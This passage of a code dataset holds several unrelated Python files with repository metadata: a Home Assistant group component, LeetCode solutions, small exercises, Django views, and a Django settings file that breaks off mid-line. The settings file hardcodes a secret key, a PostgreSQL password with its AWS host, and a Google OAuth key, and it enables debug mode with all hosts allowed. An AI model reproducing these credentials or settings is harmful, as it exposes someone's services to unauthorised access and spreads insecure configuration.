group.async_update_tracked_entity_ids(entity_ids)\n\n            if ATTR_ENTITIES in service.data:\n                entity_ids = service.data[ATTR_ENTITIES]\n                await group.async_update_tracked_entity_ids(entity_ids)\n\n            if ATTR_NAME in service.data:\n                group.name = service.data[ATTR_NAME]\n                need_update = True\n\n            if ATTR_ICON in service.data:\n                group.icon = service.data[ATTR_ICON]\n                need_update = True\n\n            if ATTR_ALL in service.data:\n                group.mode = all if service.data[ATTR_ALL] else any\n                need_update = True\n\n            if need_update:\n                group.async_write_ha_state()\n\n            return\n\n        # remove group\n        if service.service == SERVICE_REMOVE:\n            await component.async_remove_entity(entity_id)\n\n    hass.services.async_register(\n        DOMAIN,\n        SERVICE_SET,\n        locked_service_handler,\n        schema=vol.All(\n            vol.Schema(\n                {\n                    vol.Required(ATTR_OBJECT_ID): cv.slug,\n                    vol.Optional(ATTR_NAME): cv.string,\n                    vol.Optional(ATTR_ICON): cv.string,\n                    vol.Optional(ATTR_ALL): cv.boolean,\n                    vol.Exclusive(ATTR_ENTITIES, \"entities\"): cv.entity_ids,\n                    vol.Exclusive(ATTR_ADD_ENTITIES, \"entities\"): cv.entity_ids,\n                }\n            )\n        ),\n    )\n\n    hass.services.async_register(\n        DOMAIN,\n        SERVICE_REMOVE,\n        groups_service_handler,\n        schema=vol.Schema({vol.Required(ATTR_OBJECT_ID): cv.slug}),\n    )\n\n    return True\n\n\nasync def _async_process_config(hass, config, component):\n    \"\"\"Process group configuration.\"\"\"\n    for object_id, conf in config.get(DOMAIN, {}).items():\n        name = conf.get(CONF_NAME, object_id)\n        entity_ids = conf.get(CONF_ENTITIES) or []\n        icon = conf.get(CONF_ICON)\n        mode = conf.get(CONF_ALL)\n\n        # Don't create tasks and await them all. The order is important as\n        # groups get a number based on creation order.\n        await Group.async_create_group(\n            hass, name, entity_ids, icon=icon, object_id=object_id, mode=mode\n        )\n\n\nclass Group(Entity):\n    \"\"\"Track a group of entity ids.\"\"\"\n\n    def __init__(\n        self,\n        hass,\n        name,\n        order=None,\n        icon=None,\n        user_defined=True,\n        entity_ids=None,\n        mode=None,\n    ):\n        \"\"\"Initialize a group.\n\n        This Object has factory function for creation.\n        \"\"\"\n        self.hass = hass\n        self._name = name\n        self._state = STATE_UNKNOWN\n        self._icon = icon\n        if entity_ids:\n            self.tracking = tuple(ent_id.lower() for ent_id in entity_ids)\n        else:\n            self.tracking = ()\n        self.group_on = None\n        self.group_off = None\n        self.user_defined = user_defined\n        self.mode = any\n        if mode:\n            self.mode = all\n        self._order = order\n        self._assumed_state = False\n        self._async_unsub_state_changed = None\n\n    @staticmethod\n    def create_group(\n        hass,\n        name,\n        entity_ids=None,\n        user_defined=True,\n        icon=None,\n        object_id=None,\n        mode=None,\n    ):\n        \"\"\"Initialize a group.\"\"\"\n        return asyncio.run_coroutine_threadsafe(\n            Group.async_create_group(\n                hass, name, entity_ids, user_defined, icon, object_id, mode\n            ),\n            hass.loop,\n        ).result()\n\n    @staticmethod\n    async def async_create_group(\n        hass,\n        name,\n        entity_ids=None,\n        user_defined=True,\n        icon=None,\n        object_id=None,\n        mode=None,\n    ):\n        \"\"\"Initialize a group.\n\n        This method must be run in the event loop.\n        \"\"\"\n        group = Group(\n            hass,\n            name,\n            order=len(hass.states.async_entity_ids(DOMAIN)),\n            icon=icon,\n            user_defined=user_defined,\n            entity_ids=entity_ids,\n            mode=mode,\n        )\n\n        group.entity_id = async_generate_entity_id(\n            ENTITY_ID_FORMAT, object_id or name, hass=hass\n        )\n\n        # If called before the platform async_setup is called (test cases)\n        component = hass.data.get(DOMAIN)\n\n        if component is None:\n            component = hass.data[DOMAIN] = EntityComponent(_LOGGER, DOMAIN, hass)\n\n        await component.async_add_entities([group], True)\n\n        return group\n\n    @property\n    def should_poll(self):\n        \"\"\"No need to poll because groups will update themselves.\"\"\"\n        return False\n\n    @property\n    def name(self):\n        \"\"\"Return the name of the group.\"\"\"\n        return self._name\n\n    @name.setter\n    def name(self, value):\n        \"\"\"Set Group name.\"\"\"\n        self._name = value\n\n    @property\n    def state(self):\n        \"\"\"Return the state of the group.\"\"\"\n        return self._state\n\n    @property\n    def icon(self):\n        \"\"\"Return the icon of the group.\"\"\"\n        return self._icon\n\n    @icon.setter\n    def icon(self, value):\n        \"\"\"Set Icon for group.\"\"\"\n        self._icon = value\n\n    @property\n    def state_attributes(self):\n        \"\"\"Return the state attributes for the group.\"\"\"\n        data = {ATTR_ENTITY_ID: self.tracking, ATTR_ORDER: self._order}\n        if not self.user_defined:\n            data[ATTR_AUTO] = True\n        return data\n\n    @property\n    def assumed_state(self):\n        \"\"\"Test if any member has an assumed state.\"\"\"\n        return self._assumed_state\n\n    def update_tracked_entity_ids(self, entity_ids):\n        \"\"\"Update the member entity IDs.\"\"\"\n        asyncio.run_coroutine_threadsafe(\n            self.async_update_tracked_entity_ids(entity_ids), self.hass.loop\n        ).result()\n\n    async def async_update_tracked_entity_ids(self, entity_ids):\n        \"\"\"Update the member entity IDs.\n\n        This method must be run in the event loop.\n        \"\"\"\n        await self.async_stop()\n        self.tracking = tuple(ent_id.lower() for ent_id in entity_ids)\n        self.group_on, self.group_off = None, None\n\n        await self.async_update_ha_state(True)\n        self.async_start()\n\n    @callback\n    def async_start(self):\n        \"\"\"Start tracking members.\n\n        This method must be run in the event loop.\n        \"\"\"\n        if self._async_unsub_state_changed is None:\n            self._async_unsub_state_changed = async_track_state_change(\n                self.hass, self.tracking, self._async_state_changed_listener\n            )\n\n    async def async_stop(self):\n        \"\"\"Unregister the group from Home Assistant.\n\n        This method must be run in the event loop.\n        \"\"\"\n        if self._async_unsub_state_changed:\n            self._async_unsub_state_changed()\n            self._async_unsub_state_changed = None\n\n    async def async_update(self):\n        \"\"\"Query all members and determine current group state.\"\"\"\n        self._state = STATE_UNKNOWN\n        self._async_update_group_state()\n\n    async def async_added_to_hass(self):\n        \"\"\"Handle addition to Home Assistant.\"\"\"\n        if self.tracking:\n            self.async_start()\n\n    async def async_will_remove_from_hass(self):\n        \"\"\"Handle removal from Home Assistant.\"\"\"\n        if self._async_unsub_state_changed:\n            self._async_unsub_state_changed()\n            self._async_unsub_state_changed = None\n\n    async def _async_state_changed_listener(self, entity_id, old_state, new_state):\n        \"\"\"Respond to a member state changing.\n\n        This method must be run in the event loop.\n        \"\"\"\n        # removed\n        if self._async_unsub_state_changed is None:\n            return\n\n        self._async_update_group_state(new_state)\n        self.async_write_ha_state()\n\n    @property\n    def _tracking_states(self):\n        \"\"\"Return the states that the group is tracking.\"\"\"\n        states = []\n\n        for entity_id in self.tracking:\n            state = self.hass.states.get(entity_id)\n\n            if state is not None:\n                states.append(state)\n\n        return states\n\n    @callback\n    def _async_update_group_state(self, tr_state=None):\n        \"\"\"Update group state.\n\n        Optionally you can provide the only state changed since last update\n        allowing this method to take shortcuts.\n\n        This method must be run in the event loop.\n        \"\"\"\n        # To store current states of group entities. Might not be needed.\n        states = None\n        gr_state = self._state\n        gr_on = self.group_on\n        gr_off = self.group_off\n\n        # We have not determined type of group yet\n        if gr_on is None:\n            if tr_state is None:\n                states = self._tracking_states\n\n                for state in states:\n                    gr_on, gr_off = _get_group_on_off(state.state)\n                    if gr_on is not None:\n                        break\n            else:\n                gr_on, gr_off = _get_group_on_off(tr_state.state)\n\n            if gr_on is not None:\n                self.group_on, self.group_off = gr_on, gr_off\n\n        # We cannot determine state of the group\n        if gr_on is None:\n            return\n\n        if tr_state is None or (\n            (gr_state == gr_on and tr_state.state == gr_off)\n            or (gr_state == gr_off and tr_state.state == gr_on)\n            or tr_state.state not in (gr_on, gr_off)\n        ):\n            if states is None:\n                states = self._tracking_states\n\n            if self.mode(state.state == gr_on for state in states):\n                self._state = gr_on\n            else:\n                self._state = gr_off\n\n        elif tr_state.state in (gr_on, gr_off):\n            self._state = tr_state.state\n\n        if (\n            tr_state is None\n            or self._assumed_state\n            and not tr_state.attributes.get(ATTR_ASSUMED_STATE)\n        ):\n            if states is None:\n                states = self._tracking_states\n\n            self._assumed_state = self.mode(\n                state.attributes.get(ATTR_ASSUMED_STATE) for state in states\n            )\n\n        elif tr_state.attributes.get(ATTR_ASSUMED_STATE):\n            self._assumed_state = True\n"}
{"blob_id": "d252ae724c8030f21b8ec873e2d4d6bf29e0a7ad", "directory_id": "6b90d80ded56311c4483f818802cbec0b815d635", "path": "/Problem2.py", "content_id": "b5bce167d605f44654e2ab0fd2caaf5d08bb9eb7", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "akshatasawhney/Greedy-4", "snapshot_id": "ea9ad168e22e0b64381d608c008e167f35aa9397", "revision_id": "7333e2673f6e99169b054688a2c8439aa55bfd25", "branch_name": "refs/heads/master", "visit_date": "2022-12-07 00:22:46.692564", "revision_date": "2020-09-01 04:20:52", "committer_date": "2020-09-01 04:20:52", "github_id": "291892382", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2020-09-01 04:06:41", "gha_created_at": "2020-09-01 04:06:41", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "937", "extension": "py", "content": "\"\"\"\ntime : o(n)\nspace : o(1)\n\n\"\"\"\nclass Solution(object):\n    \n    def check(self,A, B, target):\n        rot_a, rot_b = 0,0\n        for i in range(len(A)):\n            if A[i] != target and B[i] != target: #if target not present in either of the arrays, no solution possible\n                return -1\n            \n            elif A[i] != target: #if not in A, increment rotation\n                rot_a += 1\n            elif B[i] != target: #similarly for B\n                rot_b += 1\n        return min(rot_a, rot_b) #return minimum rotation\n\n    def minDominoRotations(self, A, B):\n        \"\"\"\n        :type A: List[int]\n        :type B: List[int]\n        :rtype: int\n        \"\"\"\n        if len(A) == 1:\n            return 0\n        res = self.check(A,B, A[0]) #to check arow of A[0] can be formed\n        if res != -1:\n            return res \n        return self.check(A,B, B[0]) #to check arow of B[0] can be formed\n\n        \n        "}
{"blob_id": "2ab7acad45aed1088cc55db5492cc148adc779e1", "directory_id": "70f8d89858f3ce7f4b04492b6923af43b41394ef", "path": "/Unit 3/2/Activities/08-Stu_ReadNetFlix/Unsolved/netflix.py", "content_id": "7a4df35dd3f838cea48c92bbe41d6aec68662542", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "ssjtomcat/PREWORK_TNK", "snapshot_id": "c98f640530b9851163540b37758965b3be425405", "revision_id": "1fcceff6939d5aad49f66515abed610134c26b4a", "branch_name": "refs/heads/master", "visit_date": "2020-04-19 08:23:23.986144", "revision_date": "2019-01-29 02:27:13", "committer_date": "2019-01-29 02:27:13", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "894", "extension": "py", "content": "# Modules\nimport os\nimport csv\n\n# Prompt user for video lookup\nvideo = input(\"What show or movie are you looking for? \")\n\n# Set path for file\ncsvpath = os.path.join(\"..\", \"Resources\", \"netflix_ratings.csv\")\n\n# Set variable to check if we found the video\nfound = False\n\n# Open the CSV\nwith open(csvpath, newline = \"\") as csvfile:\n    csvreader = csv.reader(csvfile, delimiter = \",\")\n\n    # Loop through looking for the video\n    for row in csvreader:\n        if row[0] == video:\n            print(row[0] + \" is rated \" + row[1] + \" with a rating of \" + row[5])\n\n            # BONUS: Set variable to confirm we have found the video\n            found = True\n\n            # BONUS: Stop at first results to avoid duplicates\n            break\n\n    # If the video is never found, alert the user\n    if found is False:\n        print(\"Sorry about this, we don't seem to have what you are looking for!\")\n"}
{"blob_id": "cf533b5c6e6480bfc4190c6806832be62525289a", "directory_id": "b8fd7e01a7069a0666eb2fe21991753fd5ff7860", "path": "/Dynamic Programming/746. Min Cost Climbing Stairs rec.py", "content_id": "82f373d18007ee68c7f89698e1626d4bd217d94d", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Jafoor/Leet-Code-Solved-Problems", "snapshot_id": "0b6be0f3c82b1bc13c0c484782db65601cefa7b8", "revision_id": "935e5679e04bf6f9c9d8a0bdf8b204923a2bc7a5", "branch_name": "refs/heads/master", "visit_date": "2023-07-02 13:38:59.690783", "revision_date": "2021-07-19 16:20:48", "committer_date": "2021-07-19 16:20:48", "github_id": "256105425", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "411", "extension": "py", "content": "class Solution(object):\n    def minCostClimbingStairs(self, cost):\n        memo = [0]*(len(cost)+10)\n        m1 = solve(0,cost,memo)\n        m2 = solve(1,cost,memo)\n        return min(m1,m2)\ndef solve(i,cost,memo):\n    if i>=len(cost):\n        return 0\n    if memo[i] == 0:\n        x1 = cost[i] + solve(i+1,cost,memo)\n        x2 = cost[i] + solve(i+2,cost,memo)\n        memo[i] = min(x1,x2)\n    return memo[i]\n "}
{"blob_id": "e165e0095bc13a17d5205bf02711b8fe5a523a14", "directory_id": "10bfcaee37e21927e3192eff8c6bcd49fee7d19d", "path": "/1.hard-way/ex18.py", "content_id": "85aa2bd91eab9577cdb19f0493cf7722df8f9f4c", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "mddemarie/learn-python", "snapshot_id": "4c5c503803070fe4d5248ca99fdde2823ca5d320", "revision_id": "3e3c88738a7aee4d2fa23ee2906799cf440b0556", "branch_name": "refs/heads/master", "visit_date": "2021-01-18 05:36:33.985804", "revision_date": "2017-04-21 12:38:09", "committer_date": "2017-04-21 12:38:09", "github_id": "68725730", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "507", "extension": "py", "content": "# this one is like your scripts with argv\ndef print_two(*args):\n\targ1, arg2 = args\n\tprint (\"arg1: %r, arg2: %r\" % (arg1, arg2))\n\n# ok, that *args is actually pointless, we can just do this\ndef print_two_again(arg1, arg2):\n\tprint (\"arg1: %r, arg2: %r\" % (arg1, arg2))\n\n# this just takes one argument\ndef print_one(arg1):\n\tprint(\"arg1: %r\" % arg1)\n\n# this one takes no arguments\ndef print_none():\n\tprint(\"I got nothin'.\")\n\nprint_two(\"Zed\",\"Shaw\")\nprint_two_again(\"Zed\",\"Shaw\")\nprint_one(\"First!\")\nprint_none()"}
{"blob_id": "de65e17d5e6e9ac507ce87a8fcceec8ca660929e", "directory_id": "2e5314c4a1816301508e1d9d8094a5f99c808ff0", "path": "/phase_model_svm.py", "content_id": "b916556b431694c261a483e85a9ff3e1405b3f64", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "cahya-wirawan/phase-classification", "snapshot_id": "0ad387547c2bbdce3a1fe4cea785c8f95b04619d", "revision_id": "ca65442c4f2a30004a17cf79cbe54cf9c2f6925d", "branch_name": "refs/heads/master", "visit_date": "2022-12-14 04:58:45.215718", "revision_date": "2019-01-11 12:07:29", "committer_date": "2019-01-11 12:07:29", "github_id": "119407522", "star_events_count": "2", "fork_events_count": "2", "gha_license_id": "MIT", "gha_event_created_at": "2022-12-08 00:54:07", "gha_created_at": "2018-01-29 16:18:14", "gha_language": "Jupyter Notebook", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "478", "extension": "py", "content": "from sklearn import svm\nfrom sklearn.model_selection import GridSearchCV\n\n# define baseline model\ndef model_svm(layers, dropout=0.1, layer_number=None):\n    params_grid = [\n        {'C': [1, 10, 100, 1000], 'kernel': ['linear']},\n        {'C': [1, 10, 100, 1000], 'gamma': [0.001, 0.0001], 'kernel': ['rbf']},\n    ]\n\n    # num_round = 30  # the number of training iterations\n    model = GridSearchCV(svm.SVC(), params_grid, cv=5, scoring='accuracy', n_jobs=10)\n    return model\n"}
{"blob_id": "e9724d83cf78e3dddc579a28d001328663f29e79", "directory_id": "6baed6cbea8df4799a4d34782d3b24a555f594ec", "path": "/tasks/views.py", "content_id": "531133cea09d85a9f3072fab15954268fcccfabe", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "vishnu-vasan/todo-heroku", "snapshot_id": "86c8dab03bce1070f868e23e57acecb4cbac6651", "revision_id": "0486d69f9df10cebf35a8f846bd66f8c5f974ced", "branch_name": "refs/heads/main", "visit_date": "2023-05-13 18:08:23.657452", "revision_date": "2021-06-09 06:59:45", "committer_date": "2021-06-09 06:59:45", "github_id": "375255817", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1060", "extension": "py", "content": "from django.shortcuts import render,redirect\nfrom django.http import HttpResponse\nfrom .models import *\nfrom .forms import *\n# Create your views here.\n\ndef index(request):\n    tasks = Task.objects.all()\n    form = TaskForm()\n    if request.method == 'POST':\n        form = TaskForm(request.POST)\n        if form.is_valid():\n            form.save()\n        return redirect('/')\n    context = {'tasks':tasks,'form':form}\n    return render(request,'tasks/list.html',context)\n\ndef updateTask(request,pk):\n    task = Task.objects.get(id=pk)\n    form = TaskForm(instance=task)\n    if request.method == 'POST':\n        form = TaskForm(request.POST,instance=task)\n        if form.is_valid():\n            form.save()\n            return redirect('/')\n    context = {'form':form}\n    return render(request,'tasks/update_task.html',context)\n\ndef deleteTask(request,pk):\n    item = Task.objects.get(id=pk)\n    if request.method == 'POST':\n        item.delete()\n        return redirect('/')\n    context = {'item':item}\n    return render(request,'tasks/delete.html',context)\n"}
{"blob_id": "99760e10fa9e33679326968433083b8d2d910f35", "directory_id": "894ed667dae7e299f472a0b531ea1783ed58fd27", "path": "/src/Basic.py", "content_id": "162deaa3803d9e523e6464c785115c853ffb4632", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "satpreetsingh/OpenAgent", "snapshot_id": "dd2a8ade47159ee6b3345b9328e068e1dc419052", "revision_id": "09985fc45c0efa7fffa8a15127a0e7f48d5de30d", "branch_name": "refs/heads/master", "visit_date": "2021-05-03 07:45:26.230037", "revision_date": "2017-04-10 12:42:46", "committer_date": "2017-04-10 12:42:55", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "674", "extension": "py", "content": "class Sub:\n\tdef f (self, inputs):\n\t\treturn inputs[0] - inputs[1]\n\nclass Add:\n\tdef f (self, inputs):\n\t\treturn inputs[0] + inputs[1]\n\nclass Mult:\n\tdef f (self, inputs):\n\t\treturn inputs[0] * inputs[1]\n\nclass Less:\n\tdef f (self, inputs):\n\t\treturn inputs[0] < inputs[1]\n\nclass Equal:\n\tdef f (self, inputs):\n\t\treturn inputs[0] == inputs[1]\n\nclass More:\n\n\tdef f (self, inputs):\n\t\treturn inputs[0] > inputs[1]\n\nclass Not:\n\tdef f (self, inputs):\n\t\treturn inputs[0] == 0\n\nclass Or:\n\tdef f (self, inputs):\n\t\treturn inputs[0] == 1 or inputs[1] == 1 \n\nclass And:\n\tdef f (self, inputs):\n\t\treturn inputs[0] == 1 and inputs[1] == 1\n\nclass Abs:\n\tdef f (self, inputs):\n\t\treturn abs(inputs[0])"}
{"blob_id": "f5890676ac260060a0d5b8cffec16da4667a0c57", "directory_id": "ac3ee7d1a013a7819247458f4e3adf6efc1b7a49", "path": "/src/DestinyModel.py", "content_id": "816848b8903a6bb82bde3580baf950257737dee5", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "bepo13/destiny-stl-generator", "snapshot_id": "a90364f72d84a36fd4f99f8b8ec295f82c2b5bda", "revision_id": "df08dbdf652ea745ce7d1451a36d82df326074e2", "branch_name": "refs/heads/master", "visit_date": "2021-01-22 18:10:46.384832", "revision_date": "2014-12-27 19:56:26", "committer_date": "2014-12-27 19:56:26", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1617", "extension": "py", "content": "import os\nimport json\nimport urllib\n\nimport DataParse\nimport DestinyGeometry\n\nbungieUrlPrefix = \"http://www.bungie.net\"\nbungieGeometryPrefix = \"/common/destiny_content/geometry/platform/mobile/geometry/\"\n\nclass DestinyModel(object):\n    def __init__(self, jsonFile):\n        self.geometry = []\n        \n        # Load the json file\n        self.json = json.loads(jsonFile)\n        \n        print(\"Processing geometries...\")\n            \n        # Get the geometry file names from the json and parse the geometries\n        for geometryFile in self.json[\"content\"][0][\"geometry\"]:\n            path = bungieUrlPrefix+bungieGeometryPrefix+geometryFile\n            print(\"Geometry file: \"+path)\n            response = urllib.request.urlopen(path)\n            data = DataParse.DataParse(response.read())\n            self.geometry.append(DestinyGeometry.parse(data))\n        \n        return\n    \n    def generate(self, fileName):\n        #Open file\n        with open(fileName, 'w') as fo:\n            print(\"Writing \"+fileName+\"...\")\n                      \n            # Write name header\n            fo.write(\"solid temp\\n\")\n             \n            # Generate stl data for each geometry\n            for geometry in self.geometry:\n                status = geometry.generate(fo)\n                if status == False:\n                    # Something went wrong, cleanup the file and return\n                    fo.close()\n                    os.remove(fileName)\n        \n            # Success, close the file and return\n            print(\"Finished writing \"+fileName+\"!\")\n            fo.close()\n            \n        return\n    "}
{"blob_id": "6b095b7470d8064347710579f65895a27cff03ad", "directory_id": "f24ea88bd447d12c9d1c5aa9481cacb27980f59c", "path": "/mlPrint.py", "content_id": "dc00721aa3c7ef7d028621f8dce1950f60de6e86", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "se15m015/MAL.ue5", "snapshot_id": "bb4221da09b9dc6a416c00f253afe078ac555fd9", "revision_id": "c34edb3fb649ca5ade97e2b11491425393b96435", "branch_name": "refs/heads/master", "visit_date": "2021-01-23 03:05:00.670913", "revision_date": "2017-03-29 19:28:24", "committer_date": "2017-03-29 19:28:24", "github_id": "86047194", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2695", "extension": "py", "content": "import numpy as np\n\ndef printKNNHoldout(k, weight, acc, precision, recall, time_train, time_test):\n    print()\n    print('--------------------------------')\n    print('              KNN ' + str(k) + ' weight: ' + weight + ' - Holdout')\n    print('--------------------------------')\n    print()\n    printHoldout(acc, precision, recall, time_train, time_test)\n    return\n\ndef printKNNFold(k, weight, accSum, precisionSum, recallSum, time_trainSum, time_testSum):\n    print()\n    print('--------------------------------')\n    print('              KNN ' + str(k) + ' weight: ' + weight + ' - Fold 5')\n    print('--------------------------------')\n    print()\n    printFold(accSum, precisionSum, recallSum, time_trainSum, time_testSum)\n    return\n\ndef printRandomTreeFold(e, f, accSum, precisionSum, recallSum, time_trainSum, time_testSum):\n    print()\n    print('--------------------------------')\n    print('              RandomForrest estimators' + str(e) + ' features: ' + str(f) + ' - Fold 5')\n    print('--------------------------------')\n    print()\n    printFold(accSum, precisionSum, recallSum, time_trainSum, time_testSum)\n    return\n\n\n\ndef printHoldout(acc, precision, recall, time_train, time_test):\n\n    print(\"accuracy: \" + str(acc))\n    print(\"precision: \" + str(precision))\n    print(\"recall: \" + str(recall))\n    print(\"time training: \" + str(time_train) + \" ms \")\n    # print(\"time training: \" + str((end_time_train-start_time_train)) + \" seconds \")\n    print(\"time test: \" + str(time_test) + \" ms \")\n    # print(\"test training: \" + str((end_time_test - start_time_test)) + \" seconds \")\n    return\n\ndef printFold(accSum, precisionSum, recallSum, time_trainSum, time_testSum):\n    print()\n    print(\" ==== Result ====\")\n    print(\"Acc: mean: %s, std: %s\" % (np.mean(accSum), np.std(accSum)))\n    print(\"Precision: mean: %s, std: %s\" % (np.mean(precisionSum), np.std(precisionSum)))\n    print(\"Recall: mean: %s, std: %s\" % (np.mean(recallSum), np.std(recallSum)))\n    print(\"Time Train: mean: %s, std: %s\" % (np.mean(time_trainSum), np.std(time_trainSum)))\n    print(\"Time Test: mean: %s, std: %s\" % (np.mean(time_testSum), np.std(time_testSum)))\n    print()\n    return\n\ndef printHeader(text1=\"\", text2=\"\", text3=\"\", text4=\"\", text5=\"\", text6=\"\"):\n    print()\n    print('--------------------------------')\n    print('              ' + text1 + ' - ' + text2 + ' - ' + text3 + ' - ' + text4 + ' - ' + text5 + ' - ' + text6)\n    print('--------------------------------')\n    print()\n    return\n\ndef printHeaderDataset(name):\n    print()\n    print('================================')\n    print('              ' + name )\n    print('================================')\n    print()\n    return"}
{"blob_id": "63ddf4b52d4ca7de34fe3edee0bee60935ab4325", "directory_id": "a73b1f7876cadf0d9bc0c2c3c68400b2007bff4d", "path": "/bookmarks/settings.py", "content_id": "ab07f451146cb84b1a36762b0453006937f90105", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "mrk24251/social-networking", "snapshot_id": "31c717ace60413086056f396cc786bcb5cef8747", "revision_id": "0f8e0c9ea390dbd84df2b1daa1b95f05e58deb1b", "branch_name": "refs/heads/master", "visit_date": "2022-12-11 05:56:00.652044", "revision_date": "2021-06-18 08:36:12", "committer_date": "2021-06-18 08:36:12", "github_id": "249624656", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2022-12-08 04:26:35", "gha_created_at": "2020-03-24 05:53:17", "gha_language": "CSS", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5105", "extension": "py", "content": "\"\"\"\nDjango settings for bookmarks project.\n\nGenerated by 'django-admin startproject' using Django 3.0.3.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/3.0/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/3.0/ref/settings/\n\"\"\"\n\nimport os\nfrom django.urls import reverse_lazy\n\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\nBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/3.0/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = ')@)w-21#*$lr!@pl-2a2*^ha&3rgn7-#-)0msg$_k05t$3@a3l'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = ['*']\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'account.apps.AccountConfig',\n    'django.contrib.admin',\n    'annoying',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    \"sslserver\",\n    'django.contrib.messages',\n    'cloudinary_storage',\n    'django.contrib.staticfiles',\n    'social_django',\n    'images.apps.ImagesConfig',\n    'actions.apps.ActionsConfig',\n    'sorl.thumbnail',\n    'django.contrib.postgres',\n    'cloudinary',\n]\n\nMIDDLEWARE = [\n    'whitenoise.middleware.WhiteNoiseMiddleware',\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'bookmarks.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nSETTINGS_PATH = os.path.dirname(os.path.dirname(__file__))\n\nTEMPLATE_DIRS = (\n    os.path.join(SETTINGS_PATH, 'templates'),\n)\n\nWSGI_APPLICATION = 'bookmarks.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/3.0/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.postgresql',\n        'NAME': 'd4qe3u5blhrbam',\n        'USER': 'exausuvjcqmvse',\n        'PASSWORD': '712ff4460c544145b4cabc9b6cc78822eacba4b0670e2b660a173b0be8839e2e',\n        'HOST': 'ec2-52-200-82-50.compute-1.amazonaws.com',\n        'PORT': '5432'\n    }\n}\n\nADMINS = (\n    ('Mohammadreza Karami', 'mohammadreza.karami22@yahoo.com'),\n)\n\n\n# Password validation\n# https://docs.djangoproject.com/en/3.0/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\nABSOLUTE_URL_OVERRIDES = {\n    'auth.user': lambda u: reverse_lazy('user_detail',\n        args=[u.username])\n}\n\nTHUMBNAIL_DEBUG = True\n\nAUTHENTICATION_BACKENDS = [\n    'django.contrib.auth.backends.ModelBackend',\n    'account.authentication.EmailAuthBackend',\n    'social_core.backends.google.GoogleOAuth2',\n]\n\nSOCIAL_AUTH_GOOGLE_OAUTH2_KEY = '915019433080-sn5o3ue35inhvpgfoq572r7ufgaigka0.apps.googleusercontent.com' # Google Consumer 